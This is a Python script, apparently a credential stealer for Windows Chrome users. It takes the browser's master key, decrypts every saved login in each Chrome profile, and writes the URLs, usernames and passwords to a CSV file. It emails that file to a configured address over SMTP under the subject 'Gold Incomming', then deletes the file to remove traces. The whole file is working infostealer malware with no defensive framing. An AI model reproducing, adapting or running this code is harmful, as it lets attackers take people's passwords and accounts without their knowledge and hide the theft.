from distutils.command.config import config
import os
import re
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
import csv
import smtplib
import mimetypes
from email.mime.multipart import MIMEMultipart
from email import encoders
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
import time
import threading
import conf

 
# GLOBAL CONSTANT
CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))

def get_secret_key():
    try:
        # Get secretkey from chrome local state
        with open( CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        
        # Remove suffix DPAPI
        secret_key = secret_key[5:] 
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print("%s"%str(e))
        print("Chrome secretkey cannot be found")
        return None
    
def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        # Initialisation vector for AES decryption
        initialisation_vector = ciphertext[3:15]
        
        # Get encrypted password by removing suffix bytes (last 16 bits)
        # Encrypted password is 192 bits
        encrypted_password = ciphertext[15:-16]
        
        # Build the cipher to decrypt the ciphertext
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()  
        return decrypted_pass
    except Exception as e:
        print("%s"%str(e))
        print("Unable to decrypt, Chrome version <80 not supported. Please check.")
        return ""
    
        # Connect to local chrome db
def get_db_connection(chrome_path_login_db):
    try:
        print(chrome_path_login_db)
        shutil.copy2(chrome_path_login_db, "Loginvault.db") 
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        print("%s"%str(e))
        print("Chrome database cannot be found")
        return None
    
def send_logs():
    
    # sender/recipient info
    emailto = conf.mailacc
    emailps = conf.mailps
    fileToSend ="chrome-steel.csv"
    msg = MIMEMultipart()
    msg["From"] = emailto
    msg["To"] = emailto
    msg["Subject"] = "Gold Incomming"
    
    
    # csv file preparation
    ctype, encoding = mimetypes.guess_type(fileToSend)
    if ctype is None or encoding is not None:
        ctype = "application/octet-stream"      
    maintype, subtype = ctype.split("/", 1)
    
    if maintype == "text":
        fp = open(fileToSend)
        attachment = MIMEText(fp.read(), _subtype=subtype)
        fp.close()
    else:
        fp = open(fileToSend, "rb")
        attachment = MIMEBase(maintype, subtype)
        attachment.set_payload(fp.read())
        fp.close()
        encoders.encode_base64(attachment)
    attachment.add_header("Content-Disposition", "attachment", filename=fileToSend)
    msg.attach(attachment)
    
    #Send csv through email
    s = smtplib.SMTP('smtp.office365.com', 587)
    s.ehlo()
    s.starttls()
    print('starttls')
    s.ehlo()
    s.login(emailto, emailps)
    s.sendmail(emailto, emailto, msg.as_string())
    print('mail sent')
    s.close()
    time.sleep(1)
    
    # Remove trace
    os.remove("chrome-steel.csv")
    # os.remove("chromium-mining.py")
    
if __name__ == '__main__':
    # try:
        #Create Dataframe to store passwords
        with open('chrome-steel.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
            csv_writer = csv.writer(decrypt_password_file, delimiter=',')
            csv_writer.writerow(["index","url","username","password"])
            
            # Get secret key
            secret_key = get_secret_key()
            
            #Search user profile or default folder (this is where the encrypted login password is stored)
            folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
            
            for folder in folders:
            	# Get ciphertext from sqlite database
                chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(CHROME_PATH,folder))
                conn = get_db_connection(chrome_path_login_db)
                if(secret_key and conn):
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for index,login in enumerate(cursor.fetchall()):
                        url = login[0]
                        username = login[1]
                        ciphertext = login[2]
                        
                        if(url!="" and username!="" and ciphertext!=""):
                            # Filter the initialization vector & encrypted password from ciphertext 
                            # Use AES algorithm to decrypt the password
                            decrypted_password = decrypt_password(ciphertext, secret_key)
                            print("Sequence: %d"%(index))
                            print("URL: %s\nUser Name: %s\nPassword: %s\n"%(url,username,decrypted_password))
                            print("*"*50)
                            
                            # Save into CSV 
                            csv_writer.writerow([index,url,username,decrypted_password])
                            
                            # Thread initialize
                            T1 = threading.Thread(target=send_logs)
                            
                            
                    #Close database connection
                    cursor.close()
                    conn.close()
                    
                    #thread start
                    T1.start()
                         
                    #Delete temp login db
                    os.remove("Loginvault.db")
                                      
                    
                    
                    
  
    
    
    